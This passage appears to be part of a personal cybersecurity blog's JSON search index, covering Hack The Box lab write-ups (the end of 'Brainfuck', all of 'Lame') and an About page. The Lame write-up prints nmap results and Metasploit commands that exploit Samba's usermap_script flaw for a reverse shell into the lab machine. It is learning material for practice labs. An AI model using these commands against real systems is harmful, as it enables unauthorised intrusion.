3665666331613564626238393034373531636536353636613330356262386566 to string: 6efc1a5dbb8904751ce6566a305bb8ef root flag -\u0026gt; ********************************   Skills Learned  Enumerating SSL certificates Exploiting Wordpress Exploit modification Enumerating mail servers Decoding Vigenere ciphers SSH key brute forcing RSA decryption techniques  ","description":"Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.","id":8,"section":"posts","tags":["OSCP","rce","linux","wordpress","smtp","cryptography","ssl","cve"],"title":"Hackthebox - Brainfuck","uri":"https://hswootan.github.io/en/posts/brainfuck/"},{"content":"\r\rReconnaissance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  nmap -sC -sV -vv 10.10.10.3 -oN lame.nmap # Scan results # Nmap 7.92 scan initiated Sun Jan 30 12:20:52 2022 as: nmap -sC -sV -vv -oN lame.namp 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up, received echo-reply ttl 63 (0.019s latency). Scanned at 2022-01-30 12:20:52 EST for 56s Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.28 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg== | 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) |_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew== 139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 59488/tcp): CLEAN (Timeout) | Check 2 (port 42210/tcp): CLEAN (Timeout) | Check 3 (port 38811/udp): CLEAN (Timeout) | Check 4 (port 40169/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-security-mode: Couldn\u0026#39;t establish a SMBv2 connection. |_smb2-time: Protocol negotiation failed (SMB2) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2022-01-30T12:15:09-05:00 |_clock-skew: mean: 2h23m58s, deviation: 3h32m10s, median: -6m03s Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ # Nmap done at Sun Jan 30 12:21:48 2022 -- 1 IP address (1 host up) scanned in 56.47 seconds   Exploitation  https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  msfconsole use exploit/multi/samba/usermap_script show targets set target 0 show options set rhots 10.10.10.3 # Targeted machine set lhost 10.10.14.28 # Own machine set lport 8081 run or exploit   1 2 3 4 5 6 7 8 9  cd root cat root.txt Ans: ******************************* ---------------------------------------- cd home cd makis cat user.txt Ans: *******************************   Alternative 1 2 3  search samba 8 exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba \u0026#34;username map script\u0026#34; Command Execution   1 2 3 4 5 6 7 8  use exploit/multi/samba/usermap_script set rhosts 10.10.10.3 set lhost 10.10.14.28 set lport 8081 run   Skills Learned  Identifying vulnerable services Exploiting Samba  ","description":"Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.","id":9,"section":"posts","tags":["OSCP","linux","samba","rce","cve"],"title":"Hackthebox - Lame","uri":"https://hswootan.github.io/en/posts/lame/"},{"content":"Hello 👋 my name is Hong I am currently pursuing my degree in Cybersecurity. Interested in pen testing, cloud computing and web development. The purpose of this site is to keep track of my learning progress. I will be posting writeups on Hackthebox machines, Tryhackme, Vulnhub, CTF events, and more. Thanks for stopping by 😁.\n LinkedIn Tryhackme Hackthebox  ","description":"About me","id":10,"section":"","tags":null,"title":"About","uri":"https://hswootan.github.io/en/about/"}]